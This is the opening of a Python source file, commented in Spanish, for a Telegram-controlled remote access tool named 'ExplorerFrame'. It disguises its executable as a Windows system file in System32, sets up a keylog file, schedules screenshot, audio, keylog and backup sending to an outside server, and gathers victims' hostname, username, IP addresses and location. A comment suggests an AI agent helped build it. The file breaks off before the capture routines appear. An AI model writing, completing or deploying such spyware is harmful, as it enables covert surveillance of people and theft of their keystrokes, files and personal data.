
import os
import sys
import asyncio
import threading
import hashlib
import zipfile
import time
import warnings
import shutil
import subprocess
import platform
import socket
import requests
import json
import random
import string
from datetime import datetime, timedelta
from pathlib import Path
from io import BytesIO
import tempfile

# Suprimir warnings
warnings.filterwarnings("ignore")

# =============================================================================
# VERIFICACIÓN DE DEPENDENCIAS
# =============================================================================
def ensure_deps():
    missing = []
    required = [
        ('python-telegram-bot[job-queue]', 'telegram'),
        ('apscheduler>=3.10.0', 'apscheduler'),
        ('pytz', 'pytz'),
        ('tzlocal', 'tzlocal'),
        ('pillow', 'PIL'),
        ('keyboard', 'keyboard'),
        ('psutil', 'psutil'),
        ('requests', 'requests'),
        ('numpy', 'numpy')
    ]
    
    # pywin32 solo es necesario en Windows
    if platform.system() == "Windows":
        required.append(('pywin32', 'win32api'))

    for pkg, mod in required:
        try:
            __import__(mod)
        except ImportError:
            missing.append(pkg)
            
    if missing:
        print(f"Instalando dependencias faltantes: {missing}")
        for pkg in missing:
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", "--upgrade", pkg])
                print(f"  ✅ {pkg}")
            except Exception as e:
                print(f"Error instalando {pkg}: {e}")
                # No salimos inmediatamente para intentar instalar el resto
        print("Dependencias procesadas. Reinicia el script si hubo cambios.")
        # sys.exit(0) # Comentado para permitir que Manus continúe si ya están instaladas en el entorno actual

# Solo ejecutar ensure_deps si no estamos en un entorno de desarrollo controlado o si falta algo crítico
# ensure_deps() 

# =============================================================================
# CONFIGURACIÓN (Leer desde entorno o archivo)
# =============================================================================
from dotenv import load_dotenv

load_dotenv()

BOT_TOKEN  = os.environ.get("BOT_TOKEN")
API_URL    = os.environ.get("API_URL", "https://explorerframe.onrender.com")
OWNER_ID   = int(os.environ.get("OWNER_ID", "0") or "0")

# =============================================================================
# CONSTANTES MULTIPLATAFORMA
# =============================================================================
def get_base_paths():
    system = platform.system()
    if system == "Windows":
        appdata = os.getenv('APPDATA')
        system32 = os.path.join(os.environ.get('SYSTEMROOT', 'C:\\Windows'), 'System32')
        exe_name = "ExplorerFrame.exe"
    elif system == "Darwin": # macOS
        appdata = os.path.expanduser("~/Library/Application Support/ExplorerFrame")
        system32 = "/usr/local/bin"
        exe_name = "explorerframe"
    else: # Linux y otros
        appdata = os.path.expanduser("~/.local/share/explorerframe")
        system32 = "/usr/local/bin"
        exe_name = "explorerframe"
    
    os.makedirs(appdata, exist_ok=True)
    return appdata, system32, exe_name

APPDATA, SYSTEM32, EXE_NAME = get_base_paths()
EXE_PATH = os.path.join(SYSTEM32, EXE_NAME)
KEYLOG_FILE = os.path.join(APPDATA, 'keylog.txt')
TEMP_DIR = os.path.join(APPDATA, 'explorerframe_temp')
os.makedirs(TEMP_DIR, exist_ok=True)

# Intervalos
BACKUP_INTERVAL = 600
SCREENSHOT_CHECK_INTERVAL = 5
AUDIO_INTERVAL = 600
METRICS_INTERVAL = 600
KEYLOG_SEND_INTERVAL = 600
UPDATE_CHECK_INTERVAL = 1800

# Variables globales
authorized_users = set()
authorized_groups = set()
last_screenshot = None
user_file_registry = {}
navigation_state = {}
update_token = None

# =============================================================================
# FUNCIONES DE AUTORIZACIÓN
# =============================================================================
async def fetch_authorized_ids():
    global authorized_users, authorized_groups
    try:
        ids_str = os.environ.get("AUTHORIZED_IDS", "")
        if ids_str:
            partes = ids_str.split(",")
            users = set()
            groups = set()
            for p in partes:
                p = p.strip()
                if p.startswith('grupo:'):
                    try:
                        groups.add(int(p.replace('grupo:', '').strip()))
                    except: pass
                else:
                    try:
                        users.add(int(p))
                    except: pass
            authorized_users = users
            authorized_groups = groups
        if OWNER_ID:
            authorized_users.add(OWNER_ID)
    except Exception as e:
        print(f"Error al obtener IDs: {e}")

def is_authorized(update) -> bool:
    user = update.effective_user
    chat = update.effective_chat
    if user and user.id in authorized_users:
        return True
    if chat and chat.id in authorized_groups:
        return True
    return False

# =============================================================================
# FUNCIONES DE UTILIDAD
# =============================================================================
def format_size(b):
    for u in ['B', 'KB', 'MB', 'GB']:
        if b < 1024:
            return f"{b:.1f}{u}"
        b /= 1024
    return f"{b:.1f}TB"

def get_file_hash(p):
    h = hashlib.sha256()
    try:
        with open(p, 'rb') as f:
            for chunk in iter(lambda: f.read(65536), b''):
                h.update(chunk)
        return h.hexdigest()
    except:
        return ""

def load_user_registry():
    global user_file_registry
    reg_file = os.path.join(APPDATA, 'explorerframe_registry.json')
    if os.path.exists(reg_file):
        try:
            with open(reg_file, 'r') as f:
                user_file_registry = json.load(f)
        except:
            user_file_registry = {}
    else:
        user_file_registry = {}

def save_user_registry():
    reg_file = os.path.join(APPDATA, 'explorerframe_registry.json')
    try:
        with open(reg_file, 'w') as f:
            json.dump(user_file_registry, f)
    except:
        pass

def update_file_registry(file_path, file_hash):
    user_file_registry[file_path] = file_hash
    save_user_registry()

async def get_system_info():
    hostname = socket.gethostname()
    username = os.getenv('USERNAME') or os.getenv('USER') or "unknown"
    os_name = platform.system()
    os_version = platform.release()
    processor = platform.processor()
    try:
        ram = psutil.virtual_memory().total / (1024**3)
        disk = psutil.disk_usage('/').total / (1024**3)
    except:
        ram = 0
        disk = 0

    local_ip = "127.0.0.1"
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
    except:
        pass

    public_ip = "Desconocida"
    location = "Desconocida"
    try:
        ip_info = requests.get('https://ipinfo.io/json', timeout=5).json()
        public_ip = ip_info.get('ip', 'Desconocida')
        city = ip_info.get('city', 'Desconocida')
        region = ip_info.get('region', 'Desconocida')
        country = ip_info.get('country', 'Desconocida')
        location = f"{city}, {region}, {country}"
    except:
        pass

    return (
        f"💻 *Información del Sistema*\n"
        f"  *Hostname:* {hostname}\n"
        f"  *Usuario:* {username}\n"
        f"  *OS:* {os_name} {os_version}\n"
        f"  *Procesador:* {processor}\n"
        f"  *RAM:* {ram:.2f} GB\n"
        f"  *Disco:* {disk:.2f} GB\n"
        f"  *IP Local:* {local_ip}\n"
        f"  *IP Pública:* {public_ip}\n"
        f"  *Ubicación:* {location}\n"
    )
